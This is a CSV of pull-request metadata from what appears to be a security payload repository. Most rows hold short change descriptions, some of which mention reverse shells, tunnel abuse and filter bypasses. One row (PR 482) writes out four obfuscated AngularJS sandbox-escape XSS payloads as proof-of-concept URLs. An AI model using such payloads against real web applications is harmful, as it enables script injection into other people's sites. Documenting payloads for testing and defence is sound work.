number,created_at,merged_at,closed_at,files,additions,deletions,body_text,participants,comments
57,2019-03-23T19:30:38Z,2019-03-23T22:02:32Z,2019-03-23T22:02:32Z,1,8,0,,3,1
146,2020-01-10T12:28:04Z,2020-01-17T16:11:46Z,2020-01-17T16:11:46Z,1,1,1,Made the command to use python3 because mostly now the machines have python3 installed.,3,1
239,2020-09-02T09:43:34Z,2020-09-23T15:30:32Z,2020-09-23T15:30:32Z,1,29,1,,3,0
246,2020-09-25T02:44:12Z,2020-09-25T11:30:13Z,2020-09-25T11:30:13Z,1,7,1,Add Object Reference with Array,3,0
248,2020-10-02T04:41:48Z,2020-10-02T08:31:13Z,2020-10-02T08:31:13Z,1,3,2,SpiderLabs' version of Responder is deprecated (per its README) so I updated link to the lgandx version. Also I added InveighZero which is a great Windows alternative for Responder.,4,1
253,2020-10-03T20:15:44Z,2020-10-09T08:34:27Z,2020-10-09T08:34:27Z,1,10,0,"Same method like ngrok but with CloudFlare servers,
Abuse the unauthenticated free try of CloudFlare Argo tunnel",3,0
254,2020-10-04T09:47:07Z,2020-10-04T12:18:07Z,2020-10-04T12:18:08Z,1,10,0,,3,0
265,2020-10-13T16:37:09Z,,2020-10-15T10:01:16Z,1,3,1,,4,1
288,2020-11-03T10:41:28Z,2020-11-03T11:57:54Z,2020-11-03T11:57:54Z,1,32,0,"Hi,
since a large part of the infosec community is exchanging news on twitter, i thought that the most important accounts should not be missing in this repo. I know that the list is far from complete but at least it is a start.
Feel free to add accounts as well.",4,1
296,2020-12-02T13:21:02Z,2020-12-07T16:21:03Z,2020-12-07T16:21:03Z,1,1,1,,4,0
316,2020-12-26T21:33:35Z,,2021-01-13T09:25:57Z,1,39,0,,2,1
348,2021-03-28T13:28:25Z,2021-04-26T08:05:59Z,2021-04-26T08:05:59Z,1,2,0,Added new Bash TCP reverse shell,3,0
388,2021-07-06T14:37:18Z,2021-07-16T16:54:48Z,2021-07-16T16:54:48Z,1,54,0,Added Lessjs example PoC and reference link to advisory blog post,7,0
396,2021-07-19T21:15:12Z,,2021-11-08T16:08:52Z,1,46,1,,3,4
408,2021-07-31T03:32:27Z,,2021-07-31T09:24:36Z,1,1,1,I have added some extra information of API keys in the line 3 of README.md.,3,0
412,2021-08-09T10:59:16Z,2021-12-08T20:53:34Z,2021-12-08T20:53:34Z,2,48,82,Tried to fix web.config first. But simply replace it is much better,3,1
445,2021-10-16T08:34:56Z,2021-11-07T20:16:37Z,2021-11-07T20:16:38Z,1,1,1,Delete unused imports in cheatsheet reverse shell.,3,0
447,2021-10-18T08:13:55Z,2021-10-18T10:39:53Z,2021-10-18T10:39:53Z,1,8,25,Slight QOL improvements for the recent changes of the chapter XXE inside XLSX file,3,0
460,2021-11-10T15:43:43Z,2022-04-19T09:34:19Z,2022-04-19T09:34:19Z,2,39,1,"Added Bypass dot filter. Hopefully, this will help you bypass web protection.
ref: https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code",3,1
462,2021-11-23T17:05:58Z,2022-04-18T19:02:50Z,2022-04-18T19:02:50Z,1,1,0,Find open buckets: https://buckets.grayhatwarfare.com/,3,0
482,2022-02-23T15:22:10Z,2022-04-18T19:01:44Z,2022-04-18T19:01:44Z,1,17,0,"Added payload which executes without any usage of (')single-quotes or ("")double-quotes.
Proof of payload:
https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x={{x=767015343;y=50986827;a=x.toString(36)%2by.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}

https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x={{x=767015343;y=50986827;a=x.toString(36)%2by.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}

https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x={{x=767015343;y=50986827;a=x.toString(36)%2by.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}

https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.6.0&x={{x=767015343;y=50986827;a=x.toString(36)%2by.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",3,0
483,2022-03-04T16:41:10Z,2022-04-20T08:13:41Z,2022-04-20T08:13:41Z,1,53,0,added Groovy EL section & index,3,0
484,2022-03-08T09:35:53Z,,2022-04-18T18:59:35Z,1,1,0,,3,0
485,2022-03-12T17:31:39Z,2022-09-06T21:15:20Z,2022-09-06T21:15:20Z,1,2,0,,3,0
486,2022-03-24T06:09:47Z,2022-04-18T18:58:40Z,2022-04-18T18:58:40Z,1,3,2,,3,0
491,2022-04-09T10:56:05Z,2022-04-18T18:59:20Z,2022-04-18T18:59:20Z,1,1,0,,3,1
518,2022-08-02T11:30:50Z,,2022-09-10T17:52:00Z,1,6,0,"Using exit at the end will bypass the necessity of User-agent real data existence, and it worked for several HTB challenges",5,6
566,2022-10-06T16:44:11Z,2022-10-11T09:24:21Z,2022-10-11T09:24:21Z,1,1629,2,Merge the notes with the existing one,2,4
610,2023-01-04T05:04:30Z,2023-02-18T21:23:53Z,2023-02-18T21:23:53Z,1,2,2,"Switch ""column_name"" to ""table_name"".",3,0
